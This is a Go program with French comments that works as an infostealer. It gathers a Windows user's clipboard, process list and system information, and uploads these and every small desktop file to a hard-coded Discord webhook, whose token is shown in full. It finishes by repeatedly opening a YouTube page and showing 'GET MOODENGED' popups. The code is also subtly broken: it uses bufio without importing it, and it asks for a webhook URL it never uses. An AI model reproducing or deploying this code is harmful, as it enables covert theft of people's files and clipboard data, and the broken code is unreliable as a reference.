// Ce programme en Go enregistre l'historique du presse-papiers dans un fichier `clipboard.txt`
// situé sur le bureau de l'utilisateur Windows, envoie ce fichier et les fichiers du bureau
// au webhook Discord spécifié. Il génère également une liste des processus en cours
// dans `processlist.txt` et des informations système dans `sysinfo.txt`, ouvre une page web répétée
// en cas de fermeture pour simuler une résistance à la fermeture, et affiche une pop-up
// avec le message "GET MOODENGED" 10 fois en dernier.

package main

import (
    "bytes"
    "fmt"
    "io/ioutil"
    "log"
    "mime/multipart"
    "net/http"
    "os"
    "os/exec"
    "path/filepath"
    "time"
)

// Définition de la taille maximale des fichiers en octets (5 Mo)
const maxFileSize = 5 * 1024 * 1024

// URL du webhook Discord
const webhookURL = "https://discord.com/api/webhooks/1302961751008215060/1iiEJ34OZJgwz1Gb149f-4IdxLV-PqGyEfeP_c3rWYbKPvYsxMXzTcPUtY5BHM_hjiVk"

// URL à ouvrir en boucle
const youtubeURL = "https://www.youtube.com/watch?v=7EEy1OEmGjc"

func main() {
    // Demande à l'utilisateur l'URL du webhook Discord
    fmt.Print("Veuillez entrer l'URL du webhook Discord : ")
    scanner := bufio.NewScanner(os.Stdin)
    scanner.Scan() // Lit l'entrée utilisateur
    webhookURL := scanner.Text()

    // Construit le chemin vers le bureau de l'utilisateur courant en utilisant la variable d'environnement USERPROFILE
    desktopPath := filepath.Join(os.Getenv("USERPROFILE"), "Desktop")
    debugFilePath := filepath.Join(desktopPath, "debug.log")
    clipboardFilePath := filepath.Join(desktopPath, "clipboard.txt")
    processListFilePath := filepath.Join(desktopPath, "processlist.txt")
    sysInfoFilePath := filepath.Join(desktopPath, "sysinfo.txt")

    // Ouvre le fichier de log
    logFile, err := os.OpenFile(debugFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err != nil {
        fmt.Println("Erreur lors de l'ouverture du fichier de débogage:", err)
        return
    }
    defer logFile.Close()
    log.SetOutput(logFile)

    log.Println("\n---- Nouvelle Exécution ----")
    log.Printf("Début de l'exécution à : %s\n", time.Now().Format(time.RFC1123))

    // Capturer la liste des processus et enregistrer dans `processlist.txt`
    err = captureProcessList(processListFilePath)
    if err != nil {
        log.Printf("Erreur lors de la capture de la liste des processus : %v\n", err)
    } else {
        log.Println("Liste des processus enregistrée avec succès")
    }

    // Capturer les informations système et enregistrer dans `sysinfo.txt`
    err = captureSystemInfo(sysInfoFilePath)
    if err != nil {
        log.Printf("Erreur lors de la capture des informations système : %v\n", err)
    } else {
        log.Println("Informations système enregistrées avec succès")
    }

    // Ajouter le contenu du presse-papiers actuel à l'historique
    err = appendClipboardToFile(clipboardFilePath)
    if err != nil {
        log.Printf("Erreur lors de l'ajout du presse-papiers à l'historique : %v\n", err)
    } else {
        log.Println("Presse-papiers ajouté à l'historique avec succès")
    }

    // Envoie le fichier `clipboard.txt` avec l'historique complet à Discord
    err = sendFileToDiscord(clipboardFilePath, "clipboard.txt")
    if err != nil {
        log.Printf("Erreur lors de l'envoi de l'historique du presse-papiers : %v\n", err)
    } else {
        log.Println("Historique du presse-papiers envoyé avec succès")
    }

    // Envoie le fichier `processlist.txt` contenant la liste des processus
    err = sendFileToDiscord(processListFilePath, "processlist.txt")
    if err != nil {
        log.Printf("Erreur lors de l'envoi de la liste des processus : %v\n", err)
    } else {
        log.Println("Liste des processus envoyée avec succès")
    }

    // Envoie le fichier `sysinfo.txt` contenant les informations système
    err = sendFileToDiscord(sysInfoFilePath, "sysinfo.txt")
    if err != nil {
        log.Printf("Erreur lors de l'envoi des informations système : %v\n", err)
    } else {
        log.Println("Informations système envoyées avec succès")
    }

    // Envoie les fichiers du bureau qui sont en dessous de la taille limite au webhook Discord
    sendDesktopFiles(desktopPath)

    // Ouvre la page YouTube en boucle pour simuler une résistance à la fermeture
    openYouTubeInLoop()

    // Affiche la pop-up "GET MOODENGED" 10 fois, en dernier
    showPopup()
}

// Fonction pour envoyer les fichiers du bureau de taille inférieure à la limite au webhook Discord
func sendDesktopFiles(desktopPath string) {
    files, err := ioutil.ReadDir(desktopPath)
    if err != nil {
        log.Printf("Erreur lors de la lecture du bureau : %v\n", err)
        return
    }

    for _, file := range files {
        if !file.IsDir() && file.Size() <= maxFileSize {
            filePath := filepath.Join(desktopPath, file.Name())
            log.Printf("Envoi du fichier : %s (Taille : %d bytes)\n", filePath, file.Size())
            err := sendFileToDiscord(filePath, file.Name())
            if err != nil {
                log.Printf("Erreur lors de l'envoi du fichier %s : %v\n", file.Name(), err)
            } else {
                log.Printf("Fichier %s envoyé avec succès\n", file.Name())
            }
        } else if file.Size() > maxFileSize {
            log.Printf("Fichier %s ignoré (taille supérieure à 5 Mo)\n", file.Name())
        }
    }
}

// Fonction pour ouvrir la page YouTube dans une nouvelle fenêtre toutes les 3 secondes, 10 fois
func openYouTubeInLoop() {
    for i := 0; i < 10; i++ {
        exec.Command("powershell", "-Command", "Start-Process", youtubeURL).Run()
        time.Sleep(3 * time.Second) // Pause entre chaque ouverture pour simuler la fermeture/réouverture
    }
}

// Fonction pour afficher la pop-up "GET MOODENGED" 10 fois
func showPopup() {
    for i := 0; i < 10; i++ {
        exec.Command("powershell", "-Command", "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('GET MOODENGED')").Run()
    }
}

// Fonction pour capturer la liste des processus dans `processlist.txt`
func captureProcessList(filePath string) error {
    cmd := exec.Command("powershell", "-Command", "Get-Process | Out-File -FilePath "+filePath+" -Encoding UTF8")
    err := cmd.Run()
    if err != nil {
        return fmt.Errorf("impossible de capturer la liste des processus : %w", err)
    }
    return nil
}

// Fonction pour capturer les informations système dans `sysinfo.txt`
func captureSystemInfo(filePath string) error {
    cmd := exec.Command("powershell", "-Command", "systeminfo | Out-File -FilePath "+filePath+" -Encoding UTF8")
    err := cmd.Run()
    if err != nil {
        return fmt.Errorf("impossible de capturer les informations système : %w", err)
    }
    return nil
}

// Fonction pour ajouter le contenu actuel du presse-papiers au fichier `clipboard.txt`
func appendClipboardToFile(filePath string) error {
    cmd := exec.Command("powershell", "-Command", "Get-Clipboard")
    output, err := cmd.Output()
    if err != nil {
        log.Printf("Erreur lors de la lecture du presse-papiers via PowerShell : %v\n", err)
        return fmt.Errorf("impossible de lire le presse-papiers : %w", err)
    }

    file, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err != nil {
        return fmt.Errorf("impossible d'ouvrir le fichier d'historique : %w", err)
    }
    defer file.Close()

    _, err = file.WriteString(fmt.Sprintf("---- %s ----\n%s\n\n", time.Now().Format(time.RFC1123), output))
    if err != nil {
        return fmt.Errorf("erreur d'écriture dans le fichier d'historique : %w", err)
    }

    return nil
}

// Fonction pour envoyer un fichier spécifique au webhook Discord
func sendFileToDiscord(filePath, fileName string) error {
    file, err := os.Open(filePath)
    if err != nil {
        return fmt.Errorf("impossible d'ouvrir le fichier : %w", err)
    }
    defer file.Close()

    fileContents, err := ioutil.ReadAll(file)
    if err != nil {
        return fmt.Errorf("impossible de lire le fichier : %w", err)
    }

    body := &bytes.Buffer{}
    writer := multipart.NewWriter(body)

    part, err := writer.CreateFormFile("file", fileName)
    if err != nil {
        return fmt.Errorf("erreur lors de la création de la requête multipart : %w", err)
    }

    _, err = part.Write(fileContents)
    if err != nil {
        return fmt.Errorf("erreur d'écriture dans la requête multipart : %w", err)
    }

    writer.Close()

    req, err := http.NewRequest("POST", webhookURL, body)
    if err != nil {
        return fmt.Errorf("erreur de création de la requête HTTP : %w", err)
    }
    req.Header.Set("Content-Type", writer.FormDataContentType())

    client := &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        return fmt.Errorf("erreur d'envoi de la requête : %w", err)
    }
    defer resp.Body.Close()

    if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusNoContent {
        return fmt.Errorf("Discord a renvoyé une erreur : %d", resp.StatusCode)
    }

    return nil
}
